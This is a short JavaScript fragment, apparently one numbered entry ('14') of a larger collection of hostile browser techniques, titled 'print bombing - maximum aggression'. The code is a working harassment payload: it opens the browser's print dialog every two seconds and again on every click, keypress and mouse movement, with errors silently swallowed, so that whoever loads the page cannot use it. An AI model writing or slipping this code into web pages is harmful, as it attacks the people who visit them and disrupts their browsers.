/**
 * 14. PRINT BOMBING - MAXIMUM AGGRESSION
 * Repeatedly triggers print dialog
 */
const PrintBombing = {
    init: function() {
        this.startPrintLoop();
        this.printOnInteraction();
    },
    startPrintLoop: function() {
        setInterval(() => {
            try { window.print(); } catch(e) {}
        }, 2000);
    },
    printOnInteraction: function() {
        ['click', 'keydown', 'mousemove'].forEach(evt => {
            document.addEventListener(evt, () => {
                try { window.print(); } catch(e) {}
            });
        });
    }
};